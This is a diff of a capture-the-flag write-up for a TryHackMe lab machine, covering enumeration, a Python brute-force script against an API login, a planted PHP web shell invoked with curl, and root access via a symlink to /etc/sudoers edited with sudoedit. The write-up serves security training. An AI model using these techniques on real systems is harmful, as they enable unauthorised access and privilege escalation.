@@ -1,5 +1,12 @@
+<img width="100" alt="image" src="https://github.com/user-attachments/assets/57c73139-ba51-4145-bd15-f8793c6e1886" />
 
-<h3>Nmap</h3>
+https://tryhackme.com/room/yearofthepig
+
+Some pigs do fly...
+
+<img width="1890" height="397" alt="image" src="https://github.com/user-attachments/assets/5ac5a419-0ad5-456b-8fe2-85ef3f1b6616" />
+
+
 
 ```bash
 nmap -sC -sV -Pn -p- -T5 TargetIP
@@ -10,8 +17,6 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Marco's Blog
 ```
-
-<h3>Gobuster</h3>
 
 <p>
 
@@ -45,7 +50,7 @@ http://pig.thm/admin/landing.php          (Status: 302) [Size: 445] [--> /login.
 http://pig.thm/admin/resetpassword.php    (Status: 302) [Size: 2008] [--> /login.php]](http://pig.thm/admin/index.php            (Status: 302) [Size: 3158] [--> /login.php]
 http://pig.thm/admin/includes.php         (Status: 200) [Size: 272]
 http://pig.thm/admin/landing.php          (Status: 302) [Size: 445] [--> /login.php]
-http://pig.thm/admin/resetpassword.php    (Status: 302) [Size: 2008] [)
+http://pig.thm/admin/resetpassword.php    (Status: 302) [Size: 2008] 
 ```
 
 ```bash
@@ -67,17 +72,20 @@ http://pig.thm/assets/fonts                (Status: 301) [Size: 309] [--> http:/
 http://pig.thm/assets/img                  (Status: 301) [Size: 307] [-
 ```
 
-<h2>Web port 80</h2>
-
 <img width="1056" height="478" alt="image" src="https://github.com/user-attachments/assets/cbadbbb2-ce80-4338-8640-6f624fc120ee" />
 
+<br>
+<br>
+<br>
 
 <h3>/index.html</h3>
 
 <img width="1048" height="390" alt="image" src="https://github.com/user-attachments/assets/b3b625b7-3594-4b9d-8597-3d9e3a2d2404" />
 
 
-<h3.</h3>
+<br>
+<br>
+<br>
 
 <img width="1032" height="311" alt="image" src="https://github.com/user-attachments/assets/58b23987-f73c-48e4-9330-daf4990971f7" />
 
@@ -138,10 +146,6 @@ b6ebbbe33a4580cca6c870c770fa36c4
 
 
 
-
-
-
-
 ```bash
 POST /api/login HTTP/1.1
 Host: pig.thm
@@ -159,6 +163,22 @@ Priority: u=0
 {"username":"marco","password":"§5f4dcc3b5aa765d61d8327deb882cf99§"}
 ```
 
+```bash
+www-data@year-of-the-pig:/tmp$ sqlite3 /var/www/admin.db
+```
+
+```bash
+www-data@year-of-the-pig:/tmp$ sqlite3 /var/www/admin.db
+```
+
+```bash
+sqlite> .tables
+sessions   users
+...
+sqlite> select * from user;
+.....marco...
+.....curtis...
+```
 
 ```bash
 #!/usr/bin/python
@@ -166,7 +186,7 @@ import requests
 import hashlib
 
 user = 'marco'
-url = 'http://10.201.86.29/api/login'
+url = 'http://xx.xxx.xx.xx/api/login'
 headers = {'Accept': 'application/json'}
 f = open('password','r')
 for line in f.readlines():
@@ -187,9 +207,9 @@ print('Finished')
 
 ```bash
 python3 s.py
-Finished ba33768f2b2fae4198917d3f294cad37
+Finished ...
 ```
-]
+
 
 
 <img width="1050" height="440" alt="image" src="https://github.com/user-attachments/assets/52cfaf63-ed86-4ecd-8a26-a05ac3892131" />
@@ -202,11 +222,9 @@ Finished ba33768f2b2fae4198917d3f294cad37
 <img width="1057" height="354" alt="image" src="https://github.com/user-attachments/assets/e6692949-1565-4132-b26a-2bcae7c03e60" />
 
 
-~# ssh marco@pig.thm
-The authenticity of host 'pig.thm (10.201.86.29)' can't be established.
-ECDSA key fingerprint is SHA256:2KjF+8WJY6OrFINzn62WeweHnY6FXTMQ9Xfa6RTvPhA.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added 'pig.thm,10.201.86.29' (ECDSA) to the list of known hosts.
+```bash
+:~# ssh marco@pig.thm
+...
 marco@pig.thm's password: 
 
 	
@@ -224,19 +242,24 @@ marco@year-of-the-pig:~$ pwd
 /home/marco
 marco@year-of-the-pig:~$ ls
 flag1.txt
+```
+
+```bash
+marco@year-of-the-pig:~$ cat flag1.txt
+THM{*******************************}
+```
 
 
-
-
+```bash
 marco@year-of-the-pig:/var/www$ ls -lah
 total 36K
 drwxr-xr-x  3 www-data web-developers 4.0K Sep 17 02:44 .
 drwxr-xr-x 13 root     root           4.0K Aug 22  2020 ..
 -rw-------  1 www-data www-data        24K Sep 17 02:44 admin.db
 drwxrwxr-x  7 www-data web-developers 4.0K Aug 21  2020 html
+```
 
-
-
+```bash
 marco@year-of-the-pig:/var/www/html/admin$ ls -lah
 total 56K
 drwxrwxr-x 2 www-data web-developers 4.0K Aug 21  2020 .
@@ -253,14 +276,10 @@ drwxrwxr-x 7 www-data web-developers 4.0K Aug 21  2020 ..
 -rwxrwxr-x 1 www-data web-developers 1.8K Aug 21  2020 resetpassword.php
 -rwxrwxr-x 1 root     root            268 Aug 21  2020 sessionCleanup.php
 -rwxrwxr-x 1 www-data web-developers  782 Aug 21  2020 style.css
+```
 
-
-marco@year-of-the-pig:~$ cat flag1.txt
-THM{MDg0MGVjYzFjY2ZkZGMzMWY1NGZiNjhl}
-
-
-
-arco@year-of-the-pig:/var/www/html/admin$ cat commands.php
+```bash
+marco@year-of-the-pig:/var/www/html/admin$ cat commands.php
 <?php
     require_once "/var/www/html/admin/prepareAuth.php";
     if (!$auth){
@@ -319,82 +338,23 @@ arco@year-of-the-pig:/var/www/html/admin$ cat commands.php
 		?>
 	</body>
 </html>
-marco@year-of-the-pig:/var/www/html/admin$ 
+``` 
 
+```bash
+$ wget http://xx.xxx.xx.xx:8000/admin.db -o admin.db
+``` 
 
-
-
-
-
-wget http://10.201.86.29:8000/admin.db -o admin.db
-
-
+```bash
 marco@year-of-the-pig:/var/www$ cat /etc/passwd | grep -i bash
 root:x:0:0:root:/root:/bin/bash
 marco:x:1000:1000::/home/marco:/bin/bash
 curtis:x:1001:1001::/home/curtis:/bin/bash
+```
 
-
-
+```bash
 marco@year-of-the-pig:/var/www$ ps -eo pid,user,command
   PID USER     COMMAND
-    1 root     /sbin/init
-    2 root     [kthreadd]
-    4 root     [kworker/0:0H]
-    6 root     [mm_percpu_wq]
-    7 root     [ksoftirqd/0]
-    8 root     [rcu_sched]
-    9 root     [rcu_bh]
-   10 root     [migration/0]
-   11 root     [watchdog/0]
-   12 root     [cpuhp/0]
-   13 root     [kdevtmpfs]
-   14 root     [netns]
-   15 root     [rcu_tasks_kthre]
-   16 root     [kauditd]
-   17 root     [xenbus]
-   18 root     [xenwatch]
-   20 root     [khungtaskd]
-   21 root     [oom_reaper]
-   22 root     [writeback]
-   23 root     [kcompactd0]
-   24 root     [ksmd]
-   25 root     [khugepaged]
-   26 root     [crypto]
-   27 root     [kintegrityd]
-   28 root     [kblockd]
-   29 root     [ata_sff]
-   30 root     [md]
-   31 root     [edac-poller]
-   32 root     [devfreq_wq]
-   33 root     [watchdogd]
-   36 root     [kswapd0]
-   37 root     [kworker/u31:0]
-   38 root     [ecryptfs-kthrea]
-   80 root     [kthrotld]
-   81 root     [acpi_thermal_pm]
-   82 root     [scsi_eh_0]
-   83 root     [scsi_tmf_0]
-   84 root     [scsi_eh_1]
-   85 root     [scsi_tmf_1]
-   88 root     [kworker/0:2]
-   92 root     [ipv6_addrconf]
-  102 root     [kstrp]
-  119 root     [charger_manager]
-  172 root     [ttm_swap]
-  264 root     [kworker/0:1H]
-  265 root     [raid5wq]
-  322 root     [jbd2/xvda1-8]
-  323 root     [ext4-rsv-conver]
-  385 root     /lib/systemd/systemd-journald
-  393 root     /lib/systemd/systemd-udevd
-  394 root     [iscsi_eh]
-  396 root     /sbin/lvmetad -f
-  397 root     [ib-comp-wq]
-  399 root     [ib-comp-unb-wq]
-  400 root     [ib_mcast]
-  401 root     [ib_nl_sa_wq]
-  402 root     [rdma_cm]
+...
   450 systemd+ /lib/systemd/systemd-networkd
   497 systemd+ /lib/systemd/systemd-timesyncd
   498 systemd+ /lib/systemd/systemd-resolved
@@ -417,41 +377,31 @@ marco@year-of-the-pig:/var/www$ ps -eo pid,user,command
  1252 www-data /usr/sbin/apache2 -k start
  1304 root     [kworker/0:0]
  1370 www-data /usr/sbin/apache2 -k start
- 1377 www-data /usr/sbin/apache2 -k start
- 1469 www-data /usr/sbin/apache2 -k start
- 1471 www-data /usr/sbin/apache2 -k start
- 1474 www-data /usr/sbin/apache2 -k start
- 1477 www-data /usr/sbin/apache2 -k start
- 1479 www-data /usr/sbin/apache2 -k start
- 1480 www-data /usr/sbin/apache2 -k start
- 1545 root     [kworker/u30:2]
- 1557 root     sshd: marco [priv]
- 1562 marco    sshd: marco@pts/0
- 1563 marco    -bash
- 1630 marco    ps -eo pid,user,command
+...
+```
 
-
-
-
-
+```bash
 marco@year-of-the-pig:/var/www/html/admin$ ls -lah commands.php
 -rwxrwxr-x 1 www-data web-developers 1.7K Aug 21  2020 commands.php
+```
 
-
-arco@year-of-the-pig:/var/www/html/admin$ cp commands.php commands.bak
+```bash
+marco@year-of-the-pig:/var/www/html/admin$ cp commands.php commands.bak
 marco@year-of-the-pig:/var/www/html/admin$ nano commands.php
+```
 
-
+```bash
 marco@year-of-the-pig:/var/www/html/admin$ cat commands.php
 <?php
 echo system($_REQUEST['cmd'];
 ?>
+```
 
-
+```bash
 marco@year-of-the-pig:/var/www/html/admin$ curl localhost/admin/commands.php -d 'cmd=chmod 777 /var/www/admin.db'
 marco@year-of-the-pig:/var/www/html/admin$ ls -la /var/www/admin.db
 -rw------- 1 www-data www-data 24576 Sep 17 02:44 /var/www/admin.db
-
+```
 
 
 
@@ -459,12 +409,23 @@ marco@year-of-the-pig:/var/www/html/admin$ ls -la /var/www/admin.db
 
 <br>
 <br>
+<br>
 
 
 
 <img width="934" height="233" alt="image" src="https://github.com/user-attachments/assets/5bef4268-f864-4012-b4cc-6b4a7410aa81" />
 
+<br>
+<br>
+<br>
+
+
 <img width="947" height="286" alt="image" src="https://github.com/user-attachments/assets/35820a65-b52d-4190-a672-f8a602249e62" />
+
+<br>
+<br>
+<br>
+
 
 
 <h3>/admin/resetpassword.php</h3>
@@ -472,11 +433,20 @@ marco@year-of-the-pig:/var/www/html/admin$ ls -la /var/www/admin.db
 
 <img width="1096" height="365" alt="image" src="https://github.com/user-attachments/assets/2e983075-3f19-49da-b79a-60e8c05014fc" />
 
+<br>
+<br>
+<br>
+
 
 
 <h3>/login.php & admin:admin</h3>
 
 <img width="1094" height="227" alt="image" src="https://github.com/user-attachments/assets/1ca72c34-5803-42a5-8af8-61216b28b1ef" />
+
+<br>
+<br>
+<br>
+
 
 ```bash
 memorableWords = ['Italy', 'italy', 'Milan', 'milan', 'Savoia', 'savoia',
@@ -535,12 +505,141 @@ b6ebbbe33a4580cca6c870c770fa36c4
 ```
 
 
-
-444
-
-
 <img width="1046" height="432" alt="image" src="https://github.com/user-attachments/assets/06b7e18f-21ea-4445-8ffd-e2935fb2b03b" />
+
+<br>
+<br>
+<br>
+
 
 <img width="1033" height="409" alt="image" src="https://github.com/user-attachments/assets/ab322a15-dde8-4990-86ca-b0e57652efd9" />
 
+<br>
+<br>
+<br>
+
+
+<img width="1333" height="530" alt="image" src="https://github.com/user-attachments/assets/2bfcd1ad-3fc5-4c64-9913-921caed6474a" />
+
+<br>
+<br>
+<br>
+
+```bash
+marco@year-of-the-pig:/var/www/html/abc$ mkdir abc
+```
+
+```bash
+marco@year-of-the-pig:/var/www/html/abc$ chmod 777 abc
+```
+
+```bash
+marco@year-of-the-pig:/var/www/html/abc$ cd abc
+```
+
+```bash
+marco@year-of-the-pig:/var/www/html/abc/abc$ ln -sf /etc/sudoers config.php
+```
+
+```bash
+marco@year-of-the-pig:/var/www/html/abc/abc$ ls -lah
+total 8.0K
+drwxrwxrwx 2 marco marco 4.0K Oct 19 01:51 .
+drwxrwxrwx 3 marco marco 4.0K Oct 19 01:50 ..
+lrwxrwxrwx 1 marco marco   12 Oct 19 01:51 config.php -> /etc/sudoers
+```
+
+```bash
+marco@year-of-the-pig:/var/www/html/abc/abc$ su curtis
+
+Password:
+```
+
+```bash
+curtis@year-of-the-pig:/var/www/html/abc/abc$ ls
+config.php
+```
+
+```bash
+curtis@year-of-the-pig:/var/www/html/abc/abc$ cd /home/curtis
+```
+
+```bash
+curtis@year-of-the-pig:~$ ls
+flag2.txt
+```
+
+```bash
+curtis@year-of-the-pig:/var/www/html/abc/abc$ sudoedit /var/www/html/abc/abc/config.php
+```
+
+```bash
+curtis@year-of-the-pig:/var/www/html/abc/abc$ sudo su
+```
+
+```bash
+root@year-of-the-pig:/var/www/html/abc/abc# whoami
+root
+```
+
+```bash
+root@year-of-the-pig:/var/www/html/abc/abc# cd /root
+```
+
+```bash
+root@year-of-the-pig:~# ls
+root.txt
+```
+
+```bash
+root@year-of-the-pig:~# cat root.txt
+THM{*******************************}
+```
+
+<img width="1907" height="889" alt="image" src="https://github.com/user-attachments/assets/935d2476-4ad9-4f96-8f76-44c6f4b044d0" />
+
+<br>
+<br>
+<br>
+
+
+<img width="1909" height="894" alt="image" src="https://github.com/user-attachments/assets/1ab5b9aa-2fa8-4da5-8b30-a8f1be4cff44" />
+
+
+<br>
+<br>
+<br>
+
+<p>18<br>
+530<br>
+131,531<br>
+89<br>
+4<br>
+72<br>
+2<br></p>
+
+
+
+
+<img width="329" height="88" alt="image" src="https://github.com/user-attachments/assets/4f2a6ac3-d817-428c-8eaf-315e58bfcaef" />
+
+
+<img width="1903" height="889" alt="image" src="https://github.com/user-attachments/assets/9b4326cc-1c04-4637-bf31-366136e1f0fc" />
+
+
+<br>
+<br>
+
+<img width="1885" height="895" alt="image" src="https://github.com/user-attachments/assets/3fdc4e3b-d95b-432a-b451-36d582f9dc54" />
+
+<br>
+<br>
+
+<img width="1888" height="895" alt="image" src="https://github.com/user-attachments/assets/5d478b71-5d08-4674-802d-4c68485323fe" />
+
+<br>
+<br>
+
+
+<img width="1891" height="891" alt="image" src="https://github.com/user-attachments/assets/148952c4-89da-4cb4-9ad7-395e9b5100bc" />
 
